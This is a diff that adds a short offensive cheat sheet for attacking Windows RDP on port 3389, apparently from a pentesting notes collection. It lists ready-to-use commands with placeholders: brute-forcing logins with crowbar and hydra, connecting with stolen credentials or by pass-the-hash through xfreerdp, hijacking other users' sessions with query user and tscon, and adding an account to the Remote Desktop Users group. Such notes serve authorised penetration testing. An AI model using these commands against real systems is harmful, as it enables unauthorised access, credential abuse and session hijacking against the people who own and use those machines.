@@ -1,0 +1,23 @@
+# RDP - 3389
+# Brute force
+crowbar -b rdp -s <IP>/CIDR -u <USER> -C <PASSWORDS_LIST>
+crowbar -b rdp -s <IP>/CIDR -U <USERS_LIST> -C <PASSWORDS_LIST>
+
+hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV
+
+# Connect with known credentials / hash
+rdesktop -u <USERNAME> <IP>
+rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <IP>
+
+xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP>
+xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>
+
+# Session stealing
+# Get openned sessions
+query user
+
+# Access to the selected
+tscon <ID> /dest:<SESSIONNAME>
+
+# Adding user to RDP group (Windows)
+net localgroup "Remote Desktop Users" <USER> /add
